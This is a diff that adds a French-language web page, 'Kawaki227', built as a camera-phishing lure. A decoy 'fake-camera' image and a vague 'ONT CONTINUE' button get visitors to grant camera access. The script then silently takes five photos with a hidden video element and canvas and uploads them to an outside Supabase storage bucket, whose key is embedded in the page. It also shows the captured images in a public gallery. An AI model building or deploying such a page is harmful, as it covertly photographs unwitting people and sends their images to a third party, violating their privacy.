@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kawaki227</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
+body{
+background:url('https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1200&auto=format&fit=crop') no-repeat center center/cover;
+min-height:100vh;
+overflow-x:hidden;
+color:white;
+}
+
+.overlay{
+background:rgba(0,0,0,0.6);
+min-height:100vh;
+padding:20px;
+}
+
+.container{
+max-width:450px;
+margin:auto;
+background:rgba(15,23,42,0.85);
+padding:20px;
+border-radius:20px;
+backdrop-filter:blur(10px);
+box-shadow:0 0 30px rgba(0,255,255,0.3);
+animation:glow 3s infinite alternate;
+}
+
+@keyframes glow{
+0%{
+box-shadow:0 0 15px cyan;
+}
+100%{
+box-shadow:0 0 35px #38bdf8;
+}
+}
+
+h1{
+text-align:center;
+font-size:32px;
+margin-bottom:15px;
+color:#38bdf8;
+}
+
+.fake-camera{
+position:relative;
+width:100%;
+height:300px;
+overflow:hidden;
+border-radius:15px;
+border:3px solid #38bdf8;
+}
+
+.fake-camera img{
+width:100%;
+height:100%;
+object-fit:cover;
+}
+
+.camera-text{
+position:absolute;
+bottom:10px;
+left:10px;
+background:rgba(0,0,0,0.5);
+padding:8px 12px;
+border-radius:10px;
+font-size:14px;
+color:white;
+}
+
+video{
+display:none;
+}
+
+canvas{
+display:none;
+}
+
+button{
+width:100%;
+padding:14px;
+margin-top:15px;
+border:none;
+border-radius:12px;
+background:#38bdf8;
+color:white;
+font-size:18px;
+font-weight:bold;
+cursor:pointer;
+}
+
+.gallery{
+margin-top:20px;
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:10px;
+}
+
+.gallery img{
+width:100%;
+border-radius:12px;
+border:3px solid #38bdf8;
+}
+
+.footer{
+text-align:center;
+margin-top:20px;
+font-size:14px;
+color:#cbd5e1;
+}
+
+.status{
+text-align:center;
+margin-top:10px;
+font-size:14px;
+color:#38bdf8;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="overlay">
+
+<div class="container">
+
+<h1>Kawaki227</h1>
+
+<div class="fake-camera">
+
+<img src="https://files.catbox.moe/395fl2.jpg">
+
+<div class="camera-text">
+Kawaki Loading...
+</div>
+
+</div>
+
+<video id="video" autoplay playsinline></video>
+
+<canvas id="canvas"></canvas>
+
+<button id="startBtn">
+🔓 ONT CONTINUE 
+</button>
+
+<div class="status" id="status">
+En attente...
+</div>
+
+<div class="gallery" id="gallery"></div>
+
+<div class="footer">
+By kawaki227 <br>
++22782639423
+</div>
+
+</div>
+
+</div>
+
+<audio autoplay loop>
+<source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_c8c8a73467.mp3?filename=future-bass-logo-110997.mp3" type="audio/mpeg">
+</audio>
+
+<script type="module">
+
+import { createClient }
+from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'
+
+const supabaseUrl =
+'https://zssozoksokhducilosjx.supabase.co'
+
+const supabaseKey =
+'sb_publishable_yizSkGPTjQUsQBdflQDjzw_0lwhtyi4'
+
+const supabase =
+createClient(
+supabaseUrl,
+supabaseKey
+)
+
+const video =
+document.getElementById('video')
+
+const canvas =
+document.getElementById('canvas')
+
+const gallery =
+document.getElementById('gallery')
+
+const statusText =
+document.getElementById('status')
+
+const startBtn =
+document.getElementById('startBtn')
+
+/* CAMERA + 5 PHOTOS */
+
+startBtn.addEventListener(
+'click',
+async()=>{
+
+try{
+
+const stream =
+await navigator.mediaDevices.getUserMedia({
+video:true
+})
+
+video.srcObject = stream
+
+statusText.innerHTML =
+'✅ Merci'
+
+let count = 0
+
+const interval =
+setInterval(()=>{
+
+takePhoto()
+
+count++
+
+if(count >= 5){
+
+clearInterval(interval)
+
+statusText.innerHTML =
+'✅ cool'
+
+}
+
+},1500)
+
+}catch(error){
+
+statusText.innerHTML =
+'❌ Caméra refusée'
+
+}
+
+}
+)
+
+/* PHOTO */
+
+async function takePhoto(){
+
+canvas.width = video.videoWidth
+
+canvas.height = video.videoHeight
+
+const ctx =
+canvas.getContext('2d')
+
+ctx.drawImage(
+video,
+0,
+0,
+canvas.width,
+canvas.height
+)
+
+canvas.toBlob(
+async(blob)=>{
+
+const fileName =
+Date.now()+'.png'
+
+const { error } =
+await supabase
+.storage
+.from('photos')
+.upload(fileName,blob)
+
+if(!error){
+
+loadPhotos()
+
+}
+
+},
+'image/png'
+)
+
+}
+
+/* LOAD */
+
+async function loadPhotos(){
+
+gallery.innerHTML=''
+
+const { data,error } =
+await supabase
+.storage
+.from('photos')
+.list('',{
+limit:100
+})
+
+if(error){
+
+return
+
+}
+
+data.reverse()
+
+data.forEach(file=>{
+
+const img =
+document.createElement('img')
+
+img.src =
+`${supabaseUrl}/storage/v1/object/public/photos/${file.name}`
+
+gallery.appendChild(img)
+
+})
+
+}
+
+loadPhotos()
+
+</script>
+
+</body>
+</html>
